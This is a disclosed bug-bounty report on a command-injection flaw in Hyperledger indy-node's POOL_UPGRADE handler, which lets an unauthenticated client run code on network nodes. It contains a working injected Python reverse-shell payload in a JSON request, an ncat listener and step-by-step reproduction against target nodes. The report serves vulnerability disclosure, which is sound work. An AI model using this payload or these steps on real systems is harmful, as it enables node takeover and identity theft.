# POOL_UPGRADE request handler may allow an unauthenticated attacker to remotely execute code on every node in the network. 

## Report Details
- **Report ID**: 1705717
- **URL**: https://hackerone.com/reports/1705717
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-09-20T07:39:34.383Z
- **Disclosed**: 2022-10-20T20:07:54.109Z

## Reporter
- **Username**: shakedreiner
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: hyperledger

## Vulnerability Information
This issue is related to the https://github.com/hyperledger/indy-node. 
The issue was found in the `indy-node` code that handles the write request of type ****`POOL_UPGRADE` (in file** `indy-node/indy_node/server/request_handlers/config_req_handlers/pool_upgrade_handler.py`****).**** 

The `additional_dynamic_validation` function handles an undocumented field called `package` that can contain the name of the package to be upgraded. I case that this field is not empty, it is passed as is to the following functions `self.upgrader.check_upgrade_possible -> NodeControlUtil.curr_pkg_info -> cls._get_curr_info`.

```python
def _get_curr_info(cls, package):
    cmd = compose_cmd(['dpkg', '-s', package])
    return cls.run_shell_command(cmd)
```

As seen in the code snippet above, the user supplied name is then concatenated to the string `dpkg -s` and is run as a system command without any sanitization. 

This can lead to an attacker supplying a package name, followed by a semicolon and another system command (e.g. `package ; whoami`), resulting in a remote code execution. This of course can be any command, and in the PoC code attached I’m running a reverse shell, effectively taking control of the node, and possibly the entire network and the identities in it (assuming I run this exploit on enough nodes).

The documentation specifies that the `POOL_UPGRADE` can be run by a Trustee only, however, we can run this exploit being a client without any roles in the network.

This is made possible by the fact that the authorization that the `POOL_UPGRADE` handler performs, happens only **after** the package information has been fetched (using `self.upgrader.check_upgrade_possible`). Meaning any client can trigger the vulnerable code path and execute code on all the network’s nodes.

### Steps to reproduce:

We’ll provide 2 methods for this, using the testing framework and independently; both are detailed below. The malicious `POOL_UPGRADE` request looks as follows:

```json
{
    "identifier": "6ouriXMZkLeHsuXrN1X1fd",
    "operation": {
        "action": "start",
        "name": "test",
        "package": "a ; python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"
        172.17 .0 .2\\ ",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\" / bin / sh\\ ")\'",
        "schedule": {
            "4yC546FFzorLPgTNTc6V43DnpFrR8uHvtunBxb2Suaa2": "2022-12-25T10:25:58.271857+00:00",
            "AtDfpKFe1RPgcr5nnYBw1Wxkgyn8Zjyh5MzFoEUTeoV3": "2022-12-25T10:26:16.271857+00:00",
            "DG5M4zFm33Shrhjj6JB7nmx9BoNJUq219UXDfvwBDPe2": "2022-12-25T10:26:25.271857+00:00",
            "JpYerf4CssDrH76z7jyQPJLnZ1vwYgvKbvcp16AB5RQ": "2022-12-25T10:26:07.271857+00:00"
        },
        "sha256": "db34a72a90d026dae49c3b3f0436c8d3963476c77468ad955845a1ccf7b03f55",
        "type": "109",
        "version": "1.1"
    },
    "protocolVersion": 2,
    "reqId": 1651152851,
    "signature": "4YoXKHNnWRouTUAW4fKuTANnXNJfY2JoPG4PoXfz4PUzjx4NySrAmzkzy6zCiRRf5uczZx5mQVSm1eCZLnUHUDoT"
}
```

A few notes on some important fields:

- `package` - the undocumented field that leads to the security issue. After the semi-colon we have the injected command. In this case, a Python reverse shell (note that you’ll need to change the IP address and port to point to you)
- `schedule` - It’s important only because we need it in order to pass the `static_validation` of this request, just need to set the public nodes and a time in the future.
- `signature` - the request should be properly signed by any identity in the network (no role needed)

**Run using pytest:**

1. `cd indy_node/test/`
2. Drop the `exploit_test.py` file
3. Listen for incoming connection on a different machine (e.g. `ncat -lvvp 4444`)
4. Find the following code in the exploit `s.connect(("172.17.0.2",4444))`, and replace the address and port for your ones
5. Disable the testing patch that replaces the vulnerable function in testing mode using the following command
`sed -i '/def patchNodeControlUtil().*:/{n;s/.*/    yield/}' conftest.py`
6. Run the test and get a reverse shell
`pytest -s exploit_test.py`

**Run independently:**

1. `cd indy_node/test/`
2. Drop the `exploit.py` file
3. Listen for incoming connection on a different machine (e.g. `ncat -lvvp 4444`)
4. Find the following code in the exploit `s.connect(("172.17.0.2",4444))`, and replace the address and port for your ones
5. Replace the `ADDRESS` and `PORT` with your target node details (the node’s **client port**)
6. Replace the `SERVER_KEY` with the ZeroMQ CURVE Public Certificate of your target node (it is public info)
    1. Server key can also be obtained from the genesis file, and converted the same way it’s done here [https://github.com/hyperledger/indy-sdk/blob/master/scripts/test_zmq/src/main.rs](https://github.com/hyperledger/indy-sdk/blob/master/scripts/test_zmq/src/main.rs) or in the `indy-sdk` here `scripts/test_zmq/src/main.rs:136`
7. Run the test and get a reverse shell

## Impact

Breaking the network’s consensus, stealing every identity, getting to run code on all of the nodes.

## Attachments
No attachments
